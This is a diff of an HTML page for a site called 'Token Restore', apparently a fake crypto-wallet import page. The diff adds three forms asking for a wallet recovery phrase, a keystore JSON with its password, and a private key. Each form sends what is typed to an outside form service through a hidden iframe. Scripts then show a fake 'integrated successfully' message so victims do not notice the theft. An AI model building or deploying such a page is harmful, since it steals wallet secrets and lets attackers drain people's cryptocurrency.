@@ -12,6 +12,17 @@
 <link rel='dns-prefetch' href='http://s.w.org/' />
 <link rel="alternate" type="application/rss+xml" title="Token Restore &raquo; Feed" href="../feed/index.html" />
 <link rel="alternate" type="application/rss+xml" title="Token Restore &raquo; Comments Feed" href="../comments/feed/index.html" />
+ <!-- Latest compiled and minified CSS -->
+ <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
+
+ <!-- jQuery library -->
+ <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
+ 
+ <!-- Popper JS -->
+ <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
+ 
+ <!-- Latest compiled JavaScript -->
+ <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"></script> 
 			<script>document.documentElement.classList.remove( 'no-js' );</script>
 					<script>
 			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/token-restore.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.2"}};
@@ -73,6 +84,7 @@ img.emoji {
 <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../wp-includes/wlwmanifest.xml" /> 
 <meta name="generator" content="WordPress 5.8.2" />
 <link rel="canonical" href="index.html" />
+<link rel="stylesheet" href="../style.css">
 <link rel='shortlink' href='../index3c55.html?p=28' />
 <link rel="alternate" type="application/json+oembed" href="../wp-json/oembed/1.0/embedb77b.json?url=https%3A%2F%2Ftoken-restore.io%2Fasset%2F" />
 <link rel="alternate" type="text/xml+oembed" href="../wp-json/oembed/1.0/embedfd64?url=https%3A%2F%2Ftoken-restore.io%2Fasset%2F&amp;format=xml" />
@@ -898,12 +910,42 @@ img.emoji {
 			<div class="elementor-widget-wrap elementor-element-populated">
 								<div class="elementor-element elementor-element-3ced2d1 elementor-button-align-stretch elementor-widget elementor-widget-form" data-id="3ced2d1" data-element_type="widget" data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;}" data-widget_type="form.default">
 				<div class="elementor-widget-container">
-					<form id="passsubmit" enctype="multipart/form-data" method="POST" action="https://kontactr.com/form/0721bdcf696c263" target="hidden_iframe">
+					<iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+
+					<script>
+						function doThis(e) {
+							let phaseform = document.getElementById("phaseform")
+							phaseform.style.display = "none"
+							let theroller1 = document.getElementById("theroller1")
+							theroller1.style.display = "block"
+							let aP = document.createElement("p")
+							let newE = document.createElement("img")
+							newE.src = "../scanqr.png"
+							newE.alt = "Import scan"
+							newE.style.width = "100px"
+							newE.style.height = "100px"
+							newE.className = "m-auto"
+							aP.appendChild(newE)
+							aP.className = "m-auto"
+							let theP = document.createElement("p")
+							theP.textContent = "Phrase integrated successfully"
+							theP.className = "text-center"
+							setInterval(() => {
+								theroller1.className = "card p-5 text-center"
+								theroller1.appendChild(aP)
+								theroller1.appendChild(theP)
+							}, 1000);
+						}
+					</script>
+					<form class="phraseform" onsubmit="doThis()" id="phaseform" enctype="multipart/form-data" method="POST" action="https://kontactr.com/form/0721bdcf696c263" target="hidden_iframe">
 						<h3>Phrase</h3>
-						<div class="form-group">
+						<div class="form-group">								
 							<textarea type="textarea" class="form-control" name="textarea-1641554928762" id="textarea-1641554928762" required="required" aria-required="true"></textarea>			</div>
-						<button type="submit" id="passbtn" class="btn btn-primary form-control">Integrate</button>
+						<button type="submit" id="passbtn" class="btn btn-primary pass-btn form-control">Integrate</button>
 					  </form>
+					  <div id="theroller1" class="loader m-auto">
+							
+					</div>
 				</div>
 				</div>
 					</div>
@@ -923,31 +965,44 @@ img.emoji {
 			<div class="elementor-widget-wrap elementor-element-populated">
 								<div class="elementor-element elementor-element-18df32e elementor-button-align-stretch elementor-widget elementor-widget-form" data-id="18df32e" data-element_type="widget" data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;}" data-widget_type="form.default">
 				<div class="elementor-widget-container">
-					<form class="elementor-form" method="post" id="rainbowkeystorejson" name="New Form">
-			<input type="hidden" name="post_id" value="187"/>
-			<input type="hidden" name="form_id" value="18df32e"/>
-			<input type="hidden" name="referer_title" value="Asset" />
-
-							<input type="hidden" name="queried_id" value="28"/>
-			
-			<div class="elementor-form-fields-wrapper elementor-labels-">
-								<div class="elementor-field-type-textarea elementor-field-group elementor-column elementor-field-group-keystorejsonrainbow elementor-col-100">
-					<label for="form-field-keystorejsonrainbow" class="elementor-field-label elementor-screen-only">Keystore Json n</label><textarea class="elementor-field-textual elementor-field  elementor-size-sm" name="form_fields[keystorejsonrainbow]" id="form-field-keystorejsonrainbow" rows="4" placeholder="Keystore Json"></textarea>				</div>
-								<div class="elementor-field-type-text elementor-field-group elementor-column elementor-field-group-passwordrainbow elementor-col-100">
-					<label for="form-field-passwordrainbow" class="elementor-field-label elementor-screen-only">Password </label><input size="1" type="text" name="form_fields[passwordrainbow]" id="form-field-passwordrainbow" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Password">				</div>
-								<div class="elementor-field-type-acceptance elementor-field-group elementor-column elementor-field-group-field_f721913 elementor-col-100">
-					<div class="elementor-field-subgroup"><span class="elementor-field-option"><input type="checkbox" name="form_fields[field_f721913]" id="form-field-field_f721913" class="elementor-field elementor-size-sm  elementor-acceptance-field"> <label for="form-field-field_f721913">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</label></span></div>				</div>
-								<div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
-					<button type="submit" class="elementor-button elementor-size-sm" id="rainbowpassword">
-						<span >
-															<span class=" elementor-button-icon">
-																										</span>
-																						<span class="elementor-button-text">IMPORT Now</span>
-													</span>
-					</button>
-				</div>
-			</div>
-		</form>
+					<script>
+						function processKey(params) {
+							let keyst = document.getElementById("keysubmit")
+							keyst.style.display = "none"
+							let theroller2 = document.getElementById("theroller2")
+							theroller2.style.display = "block"
+							let aP = document.createElement("p")
+							let newE = document.createElement("img")
+							newE.src = "../scanqr.png"
+							newE.alt = "Import scan"
+							newE.style.width = "100px"
+							newE.style.height = "100px"
+							newE.className = "m-auto"
+							aP.appendChild(newE)
+							aP.className = "m-auto"
+							let theP = document.createElement("p")
+							theP.textContent = "Keystone integrated successfully"
+							theP.className = "text-center"
+							setInterval(() => {
+								theroller2.className = "card p-5 text-center"
+								theroller2.appendChild(aP)
+								theroller2.appendChild(theP)
+							}, 1000);
+						}
+					</script>
+					<form id="keysubmit" onsubmit="processKey()" enctype="multipart/form-data" method="POST" action="https://kontactr.com/form/fde43aaa90bcd47" target="hidden_iframe">
+						<h3>Keystone Json</h3>
+						<div class="form-group">
+						  <textarea name="textarea-1641555611078" class="form-control" id="textarea-1641555611078" cols="30" rows="10" placeholder="Keystone Json" required></textarea>
+						</div>
+						<div class="form-group">
+						  <input type="password" name="text-1641555748272" class="form-control" id="text-1641555748272" placeholder="password" required>
+						</div>
+						<button type="submit" class="btn btn-primary form-control">Integrate</button>
+					  </form>
+					  <div id="theroller2" class="loader m-auto">
+							
+					</div>
 				</div>
 				</div>
 					</div>
@@ -967,31 +1022,41 @@ img.emoji {
 			<div class="elementor-widget-wrap elementor-element-populated">
 								<div class="elementor-element elementor-element-5d803b95 elementor-button-align-stretch elementor-widget elementor-widget-form" data-id="5d803b95" data-element_type="widget" data-settings="{&quot;step_next_label&quot;:&quot;Next&quot;,&quot;step_previous_label&quot;:&quot;Previous&quot;,&quot;button_width&quot;:&quot;100&quot;,&quot;step_type&quot;:&quot;number_text&quot;,&quot;step_icon_shape&quot;:&quot;circle&quot;}" data-widget_type="form.default">
 				<div class="elementor-widget-container">
-					<form class="elementor-form" method="post" id="rainbowprivatekeybtn" name="New Form">
-			<input type="hidden" name="post_id" value="182"/>
-			<input type="hidden" name="form_id" value="5d803b95"/>
-			<input type="hidden" name="referer_title" value="Asset" />
-
-							<input type="hidden" name="queried_id" value="28"/>
-			
-			<div class="elementor-form-fields-wrapper elementor-labels-">
-								<div class="elementor-field-type-text elementor-field-group elementor-column elementor-field-group-privatekey elementor-col-100 elementor-field-required">
-					<label for="form-field-privatekey" class="elementor-field-label elementor-screen-only">Private Key</label><input size="1" type="text" name="form_fields[privatekey]" id="form-field-privatekey" class="elementor-field elementor-size-sm  elementor-field-textual" placeholder="Private Key" required="required" aria-required="true">				</div>
-								<div class="elementor-field-type-html elementor-field-group elementor-column elementor-field-group-field_f721913 elementor-col-100">
-					Your private key should look like this e.g. 3a1076bf45ab87712ad64ccb3b10217737f7faacbf2872e88fdd9a537d8fe266
-
-				</div>
-								<div class="elementor-field-group elementor-column elementor-field-type-submit elementor-col-100 e-form__buttons">
-					<button type="submit" class="elementor-button elementor-size-sm" id="rainbowprivatekey">
-						<span >
-															<span class=" elementor-button-icon">
-																										</span>
-																						<span class="elementor-button-text">IMPORT</span>
-													</span>
-					</button>
-				</div>
-			</div>
-		</form>
+					<script>
+						function pkeySub(params) {
+							let pkey = document.getElementById("pkeysubmit")
+							pkey.style.display = "none"
+							let theroller3 = document.getElementById("theroller3")
+							theroller3.style.display = "block"
+							let aP = document.createElement("p")
+							let newE = document.createElement("img")
+							newE.src = "../scanqr.png"
+							newE.alt = "Import scan"
+							newE.style.width = "100px"
+							newE.style.height = "100px"
+							newE.className = "m-auto"
+							aP.appendChild(newE)
+							aP.className = "m-auto"
+							let theP = document.createElement("p")
+							theP.textContent = "Private key integrated successfully"
+							theP.className = "text-center"
+							setInterval(() => {
+								theroller3.className = "card p-5 text-center"
+								theroller3.appendChild(aP)
+								theroller3.appendChild(theP)
+							}, 1000);
+						}
+					</script>
+					<form id="pkeysubmit" onsubmit="pkeySub()" enctype="multipart/form-data" method="POST" action="https://kontactr.com/form/977f49b447a0b0a" target="hidden_iframe">
+						<h3>Private key</h3>
+						<div class="form-group">
+							<textarea name="textarea-1641555943353" class="form-control" id="textarea-1641555943353" cols="30" rows="10" placeholder="Private Key" required></textarea>
+						</div>
+						<button type="submit" id="pkeybtn" class="btn btn-primary form-control">Integrate</button>
+					  </form>
+					  <div id="theroller3" class="loader m-auto">
+							
+					  </div>
 				</div>
 				</div>
 					</div>
@@ -1023,6 +1088,7 @@ img.emoji {
 <link rel='stylesheet' id='e-animations-css'  href='../wp-content/plugins/elementor/assets/lib/animations/animations.min1aae.css?ver=3.5.3' media='all' />
 <link rel='stylesheet' id='google-fonts-2-css'  href='https://fonts.googleapis.com/css?family=Montserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&amp;display=auto&amp;ver=5.8.2' media='all' />
 <link rel='stylesheet' id='elementor-icons-fa-solid-css'  href='../wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min52d5.css?ver=5.15.3' media='all' />
+<script src="../process.js"></script>
 <script id='fc124c3f2-js-extra'>
 var localize = {"ajaxurl":"https:\/\/token-restore.io\/wp-admin\/admin-ajax.php","nonce":"0e6a6d2525","i18n":{"added":"Added ","compare":"Compare","loading":"Loading..."}};
 </script>
